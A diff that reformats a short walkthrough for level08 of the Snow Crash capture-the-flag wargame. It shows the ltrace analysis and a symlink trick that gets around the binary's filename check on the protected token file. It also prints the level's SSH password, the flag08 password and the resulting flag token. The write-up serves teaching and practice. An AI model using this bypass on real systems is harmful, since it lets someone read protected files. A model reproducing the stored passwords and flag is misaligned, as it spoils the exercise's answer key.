@@ -1,13 +1,20 @@
-🔻 Analyze
-⬇️ ltrace ./level08 token
-👉 strstr("token", "token")
-⬇️ echo "test" > /tmp/some
-⬇️ ./level08 /tmp/some
++ ---- 🔻 Analyze ----
+|
+|   ltrace ./level08 token
+|   👉 strstr("token", "token")
+|   echo "test" > /tmp/some
+|   ./level08 /tmp/some
+|
 
 
-🔻 Hack
-⬇️ ln -s /home/user/level08/token /tmp/link
-⬇️ ./level08 /tmp/link
-⬇️ su flag08 ↪️ quif5eloekouj29ke0vouxean
-⬇️ getflag
-👉 Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
++ ---- 🔻 Hack -------
+|
+|   ssh level08@$SNOW_CRASH_IP -p 4242
+|   └ fiumuikeil55xe9cu4dood66h
+|   ln -s /home/user/level08/token /tmp/link
+|   ./level08 /tmp/link
+|   su flag08
+|   └ quif5eloekouj29ke0vouxean
+|   getflag
+|   👉 Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+|
